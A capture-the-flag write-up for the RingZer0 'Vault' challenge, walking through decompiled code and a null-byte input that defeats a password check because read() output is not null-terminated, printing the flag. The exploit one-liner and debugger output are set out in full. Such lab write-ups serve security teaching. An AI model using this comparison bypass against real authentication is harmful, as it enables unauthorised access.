# Writeup for Vault Exploit - RingZer0

So when we download the file with this command
```text
┌──(hanoz㉿kali)-[~/Desktop/ringzer0]
└─$ ssh agent@challenges.ringzer0team.com -p10325 'cat vault' > vault              
agent@challenges.ringzer0team.com's password:
```

Now let's analyse the code and see what's going on. 
First, we have a bunch of variables declared and then we have a couple of initializations. Let's see what it's all about
```text
  local_28 = 0x64726f7773736170;
  local_20 = 0x6e6f632e;
  local_1c = 0x66;
  local_38 = 0x7478742e67616c66;
```

So these hex seem like they are in ascii range. 
Let's try and perform some decoding 

```text
local_38 decodes to txt.galf
```

Yes, so from this we can infer that these bytes are little endian ordered.
So we need to change that

```text
local_28 = "password"
local_20 = ".con"
local_1c = "f"
local_38 = "flag.txt"
```

Interesting. 
The rest of the code is 
```text
  puts("Please enter the vault password to unlock the master FLAG\nPassword:");
  stat((char *)&local_28,(stat *)local_c8);
  iVar1 = local_c8._48_4_;
  local_d8 = open((char *)&local_28,0);
  read(0,acStack232,0x28);
  local_f0 = (char *)malloc((long)iVar1);
  read(local_d8,local_f0,(long)iVar1);
  iVar1 = strcmp(local_f0,acStack232);
  if (iVar1 == 0) {
    local_d4 = open((char *)&local_38,0);
    stat((char *)&local_38,(stat *)local_c8);
    local_f8 = malloc((long)local_c8._48_4_);
    read(local_d4,local_f8,(long)local_c8._48_4_);
    printf("Access Granted: %s\n",local_f8);
```

Its reading from password.conf
If it exists, its storing the file in buffer. Then it is comparing that to our input from read. Then it is reading flag.txt and then printing it out to us. 

So intersting things, read is not null terminated and it is used everywhere. So if we pass an input buffer of size 40 let's see what happens. 

If we try to do this
```text
python3 -c 'print("A"*40)'
```
We get an error in debugging
```text
error: maximum array length seems negative
, "", 9) 
```

So after thinking about it for a while, I realized my mistake

When I do A x 40, and press enter, the input becomes AAA...AAA/n. 
It becomes 41 charectors which is larger than the input size allowed in read. 

When we pass an input of size 39,
```text
python3 -c 'print("A"*39)'
```
Something interesting happens in our debugger
```text
strcmp("", "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)
```

It is comparing our input with a null.

We are NOT using a printf() function which will stop reading when it encounters \x00. We are using a read() function. Thus, we can perfectly well pass \x00 as a valid input and when it is processed, it will be processed as a null, but the memory will store that as we send it. 

Thus, our final payload is
```text
$ python3 -c 'print("\x00"*39)' | ./vault
Please enter the vault password to unlock the master FLAG
Password:
Access Granted: ********************
```

We have the flag!


